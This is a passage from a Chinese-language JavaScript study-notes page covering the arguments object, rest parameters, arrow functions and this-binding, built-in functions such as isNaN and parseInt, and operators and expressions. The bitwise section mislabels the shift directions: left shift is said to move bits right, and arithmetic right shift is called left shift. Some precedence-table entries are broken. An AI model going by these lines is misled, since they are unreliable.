title="arguments对象"></a>arguments对象</h3><p><strong>函数的实参</strong>会被<strong>保存</strong>在一个类似数组的<strong>arguments对象</strong>中。</p><p>使用<code>arguments[i];</code>访问。</p><p>arguments对象在不知道函数的传参个数时非常有用，可以使用<code>arguments.length</code> 来获得实际传递给函数的参数的数量。</p><p>例如一个连接字符串的函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myConcat</span>(<span class="hljs-params">separator</span>) &#123;<br>  <span class="hljs-keyword">let</span> result = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">// 初始化列表</span><br>  <span class="hljs-comment">// 迭代 arguments</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span>; i++) &#123;<br>    result += <span class="hljs-variable language_">arguments</span>[i] + separator;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">/*.....*/</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">myConcat</span>(<span class="hljs-string">&quot;、&quot;</span>, <span class="hljs-string">&quot;红&quot;</span>, <span class="hljs-string">&quot;橙&quot;</span>, <span class="hljs-string">&quot;蓝&quot;</span>));<br><span class="hljs-comment">// &quot;红、橙、蓝、&quot;</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">myConcat</span>(<span class="hljs-string">&quot;；&quot;</span>, <span class="hljs-string">&quot;大象&quot;</span>, <span class="hljs-string">&quot;长颈鹿&quot;</span>, <span class="hljs-string">&quot;狮子&quot;</span>, <span class="hljs-string">&quot;猎豹&quot;</span>));<br><span class="hljs-comment">// &quot;大象；长颈鹿；狮子；猎豹；&quot;</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">myConcat</span>(<span class="hljs-string">&quot;。&quot;</span>, <span class="hljs-string">&quot;智者&quot;</span>, <span class="hljs-string">&quot;罗勒&quot;</span>, <span class="hljs-string">&quot;牛至&quot;</span>, <span class="hljs-string">&quot;胡椒&quot;</span>, <span class="hljs-string">&quot;香菜&quot;</span>));<br><span class="hljs-comment">// &quot;智者。罗勒。牛至。胡椒。香菜。&quot;</span><br></code></pre></td></tr></table></figure><h3 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h3><p>两种特殊的参数语法：默认参数和剩余参数。</p><ul><li><p><strong>默认参数</strong></p><ul><li>js中参数的<strong>默认值</strong>是<strong>undefined</strong>。</li><li>然而在某些情况需要设置一个不同的默认值。例如1。</li></ul></li><li><p><strong>剩余参数</strong>（Rest Parameter）</p><ul><li><p>剩余参数语法允许<strong>将不确定数量的参数</strong>表示为<strong>数组</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">multiplier, ...theArgs</span>) &#123;<br>  <span class="hljs-keyword">return</span> theArgs.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> multiplier * x);<br>&#125;<br><br><span class="hljs-keyword">const</span> arr = <span class="hljs-title function_">multiply</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// [2, 4, 6]</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="箭头函数（胖箭头）"><a href="#箭头函数（胖箭头）" class="headerlink" title="箭头函数（胖箭头）"></a>箭头函数（胖箭头）</h3><p><strong>箭头函数表达式</strong>（也称胖箭头，**&#x3D;&gt;<strong>，以区分未来 JavaScript 中假设的 -&gt; 语法）相比函数表达式具有</strong>较短的语法**，且没有它自己的 this、arguments、super 和 new.target。</p><p><strong>箭头函数总是匿名的</strong>。</p><p>特点：简洁、无单独的this。</p><p>例1：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> myFunc = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> myVar = <span class="hljs-string">&quot;value&quot;</span>;<br>  <span class="hljs-keyword">return</span> myVar;<br>&#125;<br><span class="hljs-comment">//ES6提供了新的语法糖来实现匿名函数（箭头）</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">myFunc</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> myVar = <span class="hljs-string">&quot;value&quot;</span>;<br>  <span class="hljs-keyword">return</span> myVar;<br>&#125;<br><span class="hljs-comment">//没有函数体，只有返回值时，可以更精简</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">myFunc</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-string">&quot;value&quot;</span>;<br><span class="hljs-comment">//可以写入参数</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">multiplier</span> = (<span class="hljs-params">item, multi</span>) =&gt; item * multi;<br><span class="hljs-title function_">multiplier</span>(<span class="hljs-number">4</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//8</span><br><span class="hljs-comment">//可以设定默认参数</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">greeting</span> = (<span class="hljs-params">name = <span class="hljs-string">&quot;Anonymous&quot;</span></span>) =&gt; <span class="hljs-string">&quot;Hello &quot;</span> + name;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greeting</span>(<span class="hljs-string">&quot;John&quot;</span>)); <span class="hljs-comment">//Hello John</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greeting</span>()); <span class="hljs-comment">//Hello Anonymous</span><br></code></pre></td></tr></table></figure><p>例2：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = [<span class="hljs-string">&quot;Hydrogen&quot;</span>, <span class="hljs-string">&quot;Helium&quot;</span>, <span class="hljs-string">&quot;Lithium&quot;</span>, <span class="hljs-string">&quot;Beryllium&quot;</span>];<br><br><span class="hljs-keyword">const</span> a2 = a.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">s</span>) &#123;<br>  <span class="hljs-keyword">return</span> s.<span class="hljs-property">length</span>;<br>&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a2); <span class="hljs-comment">// [8, 6, 7, 9]</span><br><br><span class="hljs-comment">//使用箭头函数</span><br><span class="hljs-keyword">const</span> a3 = a.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">s</span>) =&gt;</span> s.<span class="hljs-property">length</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a3); <span class="hljs-comment">// [8, 6, 7, 9]</span><br></code></pre></td></tr></table></figure><p>在箭头函数出现前，每一个新函数都定义了自己的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/this">this</a>值（在不同情况下含义并不相同）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 构造函数 Person() 将 `this` 定义为自身。</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">growUp</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 在非严格模式下，growUp() 函数将 `this` 定义为“全局对象”，</span><br>    <span class="hljs-comment">// 这与 Person() 定义的 `this` 不同。</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>++;<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br></code></pre></td></tr></table></figure><p>在 ECMAScript 3&#x2F;5 中，可以通过<strong>把 <code>this</code> 的值赋值给一个变量</strong>来修复这个问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 有的人习惯用 `that` 而不是 `self`。</span><br>  <span class="hljs-comment">// 请选择一种方式，并保持前后代码的一致性</span><br>  <span class="hljs-keyword">const</span> self = <span class="hljs-variable language_">this</span>;<br>  self.<span class="hljs-property">age</span> = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">growUp</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 回调引用 `self` 变量，其值为预期的对象。</span><br>    self.<span class="hljs-property">age</span>++;<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>创建一个<strong>绑定函数</strong>也可以使this值被正确传递给growUp()函数。</p><ul><li><p><strong><code>bind()</code></strong> 方法创建一个新的绑定函数。当调用该新函数时，它会调用原始函数并将其 <code>this</code> 关键字设置为给定的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = &#123;<br>  <span class="hljs-attr">x</span>: <span class="hljs-number">42</span>,<br>  <span class="hljs-attr">getX</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>;<br>  &#125;,<br>&#125;;<br><br><span class="hljs-keyword">const</span> unboundGetX = <span class="hljs-variable language_">module</span>.<span class="hljs-property">getX</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">unboundGetX</span>()); <span class="hljs-comment">// The function gets invoked at the global scope</span><br><span class="hljs-comment">// Expected output: undefined</span><br><br><span class="hljs-keyword">const</span> boundGetX = unboundGetX.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">module</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">boundGetX</span>());<br><span class="hljs-comment">// Expected output: 42</span><br></code></pre></td></tr></table></figure></li></ul><p>箭头函数**没有自己的 <code>this</code>**，而是使用封闭执行上下文的 <code>this</code> 值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>++; <span class="hljs-comment">// 这里的 `this` 正确地指向 person 对象</span><br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br></code></pre></td></tr></table></figure><h3 id="预定义函数"><a href="#预定义函数" class="headerlink" title="预定义函数"></a>预定义函数</h3><p>js的一些顶级内置函数：</p><ul><li><p><strong><code>eval()</code></strong> ：将传入的字符串当做JavaScript代码执行。</p></li><li><p><strong><code>isFinite()</code></strong> ：用来判断被传入的参数值是否为一个有限数值（finite number）</p><ul><li>参数为Nan或正负无穷大——返回false</li><li>其他——true</li></ul></li><li><p><strong><code>isNaN()</code></strong> ：判断一个值是否是 NaN。</p><p>给定值返回true为NaN，否则为false。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//示例</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-title class_">NaN</span>); <span class="hljs-comment">// true</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-literal">undefined</span>); <span class="hljs-comment">// true</span><br><span class="hljs-built_in">isNaN</span>(&#123;&#125;); <span class="hljs-comment">// true</span><br><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// false</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// false</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-number">37</span>); <span class="hljs-comment">// false</span><br><br><span class="hljs-comment">// strings</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-string">&quot;37&quot;</span>); <span class="hljs-comment">// false: 可以被转换成数值 37</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-string">&quot;37.37&quot;</span>); <span class="hljs-comment">// false: 可以被转换成数值 37.37</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-string">&quot;37,5&quot;</span>); <span class="hljs-comment">// true</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-string">&quot;123ABC&quot;</span>); <span class="hljs-comment">// true:  parseInt(&quot;123ABC&quot;) 的结果是 123，但是 Number(&quot;123ABC&quot;) 结果是 NaN</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-string">&quot;&quot;</span>); <span class="hljs-comment">// false: 空字符串被转换成 0</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-string">&quot; &quot;</span>); <span class="hljs-comment">// false: 包含空格的字符串被转换成 0</span><br><br><span class="hljs-comment">// dates</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()); <span class="hljs-comment">// false</span><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// true</span><br><br><span class="hljs-built_in">isNaN</span>(<span class="hljs-string">&quot;blabla&quot;</span>); <span class="hljs-comment">// true: &quot;blabla&quot;不能转换成数值</span><br><span class="hljs-comment">// 转换成数值失败，返回 NaN</span><br></code></pre></td></tr></table></figure><ul><li><strong>NaN</strong>：表示一个非数字的值。<ul><li>NaN值的产生：算术运算返回一个<strong>未定义</strong>或<strong>无法表示</strong>的值时。例如0除以0（但其他数值除以0不会产生NaN）</li></ul></li><li>如果isNaN函数的参数不是Number类型，会先强转为数值后进行判断。<ul><li>但对于能强转为有效的非NaN数值来说，返回false就显得很奇怪。例如不是NaN的空字符串和布尔值，会被强制转换为数值0和1。</li></ul></li><li><strong><code>Number.isNaN()</code></strong> 静态方法比**<code>isNaN()</code>**更加健壮。</li></ul></li><li><p><strong><code>parseFloat()</code></strong> ：解析一个参数（必要时先转换为字符串）并返回一个浮点数。</p></li><li><p>**<code>parseInt()</code>**：解析字符串参数，并返回指定的基数的整数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">parseInt</span>(<span class="hljs-string">&#x27;ff&#x27;</span>, <span class="hljs-number">16</span>));<br><span class="hljs-comment">// 255 (lower-case hexadecimal)</span><br></code></pre></td></tr></table></figure></li><li><p><strong><code>decodeURI()</code></strong> ：对先前经过 <code>encodeURI</code>函数或者其他类似方法编码过的统一资源标志符（URI）进行<strong>解码</strong>。</p></li><li><p><strong><code>encodeURI()</code></strong> ：通过将特定字符的每个实例替换为一个、两个、三或四转义序列来对统一资源标识符 (URI) 进行<strong>编码</strong>。</p></li><li><p><strong><code>decodeURIComponent()</code></strong> 方法对先前经过 <code>encodeURIComponent</code>函数或者其他类似方法编码的统一资源标志符（URI）进行<strong>解码</strong>。</p></li><li><p><strong><code>encodeURIComponent()</code></strong> 方法通过以表示字符的 UTF-8 编码的一个、两个、三个或四个转义序列替换统一资源标识符（URI）的某些字符来进行<strong>编码</strong>。</p></li><li><p><strong><code>escape()</code></strong> ：方法生成一个新的字符串，其中的某些字符已被替换为十六进制转义序列。</p><ul><li>已不再推荐。请使用 encodeURI() 或 encodeURIComponent() 代替。</li></ul></li><li><p><strong><code>unescape()</code></strong> 方法计算生成一个新的字符串，其中的十六进制转义序列将被其表示的字符替换。</p><ul><li>已不再推荐。请使用 decodeURI() 或 decodeURIComponent() 替代。</li></ul></li></ul><h2 id="1-5表达式与运算符"><a href="#1-5表达式与运算符" class="headerlink" title="1.5表达式与运算符"></a>1.5表达式与运算符</h2><p>详情见：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Expressions_and_operators">参考</a></p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><p>将右边操作数的值赋给左边的操作数。</p><p>最简单的赋值运算符就是<code>=</code>，例如x&#x3D;y，就是把y的值赋给x。</p><p>还有一些复合赋值操作符，例如：</p><ul><li>加+、减-、乘*、除&#x2F;、求余%、求幂<code>**</code></li><li>左移位运算&lt;&lt;，右移位运算&gt;&gt;<ul><li>将一个操作数的二进制表示形式向左&#x2F;右移动指定位数。</li></ul></li><li>无符号右移位赋值&gt;&gt;&gt;</li><li>按位与&amp;、按位异或^、按位或|</li></ul><h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p>比较它的操作数并返回一个基于表达式是否为真的逻辑值。</p><p>在多数情况下，如果两个操作数不是相同的类型，JavaScript 会尝试转换它们为恰当的类型来比较。</p><ul><li>等于 &#x3D;&#x3D;：两边操作数相等返回true</li><li>不等于!&#x3D;：两边操作数不相等返回true</li><li>**全等&#x3D;&#x3D;&#x3D;**：两边操作数相等且类型相同时返回true。</li><li>**不全等!&#x3D;&#x3D;**：两边操作数不相等 或 类型不同时返回ture</li><li>大于&gt;、大于等于&gt;&#x3D;</li><li>小于&lt;、小于等于&lt;&#x3D;</li></ul><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><p>算术运算符使用数值 (字面量或者变量) 作为操作数并返回一个数值。</p><p>标准的算术运算符就是加减乘除 (+ - * &#x2F;)。</p><p>其他的js算术运算符：</p><ul><li>求余%</li><li>自增++、自减–</li><li>一元负值符<code>-</code>：返回操作数的负值</li><li>一元正值符<code>+</code>：如果操作数在之前不是数值，尝试转换为数值。</li><li>指数运算符**：计算底数（base）和指数（exponent）次方。表示为base^exponent。</li></ul><h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><p>位运算符将它的操作数视为 32 位元的二进制串。（而非其他进制）</p><ul><li>按位与AND：<code>a&amp;b</code>，都为1则为1</li><li>按位或OR：<code>a|b</code>，有一位1则为1</li><li>按位异或XOR：<code>a^b</code>，<strong>仅有</strong>一位1时为1</li><li>按位非NOT：<code>~a</code></li><li>左移shift：<code>a&lt;&lt;b</code>，将a的二进制数表示 向右移动b位，丢弃被移出的位。</li><li>算术右移：<code>a&gt;&gt;b</code>。左移，空位根据最高位是0或是1来填充。</li><li>无符号右移：<code>a&gt;&gt;&gt;b</code>。</li></ul><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p>逻辑运算符常用于布尔（逻辑）值之间。</p><ul><li>逻辑与&amp;&amp;</li><li>逻辑或||</li><li>逻辑非 !expr</li></ul><p><strong>短路求值</strong>：作为逻辑表达式进行求值是从左到右，它们是为可能的“短路”的出现而使用以下规则进行测试。</p><ul><li><code>false</code> &amp;&amp; <em>anything</em> &#x2F;&#x2F; 被短路求值为 false</li><li><code>true</code> || <em>anything</em> &#x2F;&#x2F; 被短路求值为 true</li></ul><h4 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h4><p>用连接操作符(+) 将两个字符串值相连接。</p><p>也可以简写为<code>+=</code>来拼接。</p><h4 id="条件（三元）运算符"><a href="#条件（三元）运算符" class="headerlink" title="条件（三元）运算符"></a>条件（三元）运算符</h4><p>js中唯一需要三个操作数的运算符。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">条件 ? 值 <span class="hljs-number">1</span> : 值 <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>如果<code>条件</code>为真，则结果取<code>值 1</code>。否则为<code>值 2</code>。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> status = age &gt;= <span class="hljs-number">18</span> ? <span class="hljs-string">&quot;adult&quot;</span> : <span class="hljs-string">&quot;minor&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="逗号运算符"><a href="#逗号运算符" class="headerlink" title="逗号运算符"></a>逗号运算符</h4><p>对两个操作数进行求值并返回最终操作数的值。</p><p>常用在for循环中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">expr1, expr2, expr3<span class="hljs-comment">/* , … */</span><br></code></pre></td></tr></table></figure><p>例如用逗号操作符同时改变两个变量的值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> x = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>];<br><span class="hljs-keyword">var</span> a = [x, x, x, x, x];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">9</span>; i &lt;= j; i++, j--)<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;a[&quot;</span> + i + <span class="hljs-string">&quot;][&quot;</span> + j + <span class="hljs-string">&quot;]= &quot;</span> + a[i][j]);<br></code></pre></td></tr></table></figure><h4 id="一元运算符"><a href="#一元运算符" class="headerlink" title="一元运算符"></a>一元运算符</h4><p>仅对应一个操作数。</p><ul><li><p><strong>delete</strong>：删除一个对象的属性或者一个数组中某个键值。</p><ul><li>删除成功后，属性或者元素会变成undefined</li><li>delete删除数组元素，元素就不在数组中了，寻址返回undefined。</li></ul></li><li><p><strong>typeof</strong>：返回一个表示 operand 类型的字符串值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">typeof</span> operand;<br><span class="hljs-keyword">typeof</span> (operand);<br></code></pre></td></tr></table></figure></li><li><p><strong>void</strong>：表明一个运算没有返回值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">void</span> expression;<br><span class="hljs-keyword">void</span> (expression);<br></code></pre></td></tr></table></figure></li></ul><h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><p>对操作数进行比较，根据比较结果真或假，返回相应的布尔值。</p><ul><li><p><strong>in</strong>：如果指定的属性存在于所指定的对象中，返回true</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">propNameOrNumber <span class="hljs-keyword">in</span> objectName;<br></code></pre></td></tr></table></figure></li><li><p><strong>instanceof</strong>：如果所判别的对象确实是所指定的类型，则返回<code>true</code></p></li></ul><h4 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h4><p>从高到低。</p><table><thead><tr><th>Operator type</th><th>Individual operators</th></tr></thead><tbody><tr><td>member</td><td><code>. []</code></td></tr><tr><td>call &#x2F; create instance</td><td><code>() new</code></td></tr><tr><td>negation&#x2F;increment</td><td><code>! ~ - + ++ -- typeof void delete</code></td></tr><tr><td>multiply&#x2F;divide</td><td><code>* / %</code></td></tr><tr><td>addition&#x2F;subtraction</td><td><code>+ -</code></td></tr><tr><td>bitwise shift</td><td><code>&lt;&lt; &gt;&gt; &gt;&gt;&gt;</code></td></tr><tr><td>relational</td><td><code>&lt; &lt;= &gt; &gt;= in instanceof</code></td></tr><tr><td>equality</td><td><code>== != === !==</code></td></tr><tr><td>bitwise-and</td><td><code>&amp;</code></td></tr><tr><td>bitwise-xor</td><td><code>^</code></td></tr><tr><td>bitwise-or</td><td>&#96;</td></tr><tr><td>logical-and</td><td><code>&amp;&amp;</code></td></tr><tr><td>logical-or</td><td>&#96;</td></tr><tr><td>conditional</td><td><code>?:</code></td></tr><tr><td>assignment</td><td>&#96;&#x3D; +&#x3D; -&#x3D; *&#x3D; &#x2F;&#x3D; %&#x3D; &lt;&lt;&#x3D; &gt;&gt;&#x3D; &gt;&gt;&gt;&#x3D; &amp;&#x3D; ^&#x3D;</td></tr><tr><td>comma</td><td><code>,</code></td></tr></tbody></table><h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><p>表达式是一组代码的集合，它返回一个值。</p><p>js的表达式类型：</p><ul><li>算数：得出一个数字，例如 3.14159。（通常使用算数运算符）</li><li>字符串：得出一个字符串，例如，”Fred” 或 “234”。（通常使用字符串运算符)。）</li><li>逻辑值：得出 true 或者 false。（经常涉及到逻辑运算符)。）</li><li>基本表达式：javascript 中基本的关键字和一般表达式。</li><li>左值表达式：分配给左值。</li></ul><h4 id="基本表达式"><a href="#基本表达式" class="headerlink" title="基本表达式"></a>基本表达式</h4><ul><li><strong>this</strong> 关键字：被用于指代当前的对象</li><li>分组操作符 <strong>()</strong> ：控制了表达式中计算的优先级。</li></ul><h4 id="左值表达式"><a href="#左值表达式" class="headerlink" title="左值表达式"></a>左值表达式</h4><ul><li><p><strong>new</strong> 运算符：创建一个自定义类型或者是预置类型的对象实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> objectName = <span class="hljs-keyword">new</span> <span class="hljs-title function_">objectType</span>([param1, param2, ..., paramN]);<br></code></pre></td></tr></table></figure></li><li><p><strong>super</strong> 关键字：调用一个对象父类的函数。</p></li></ul><h2 id="1-6数字和日期"><a 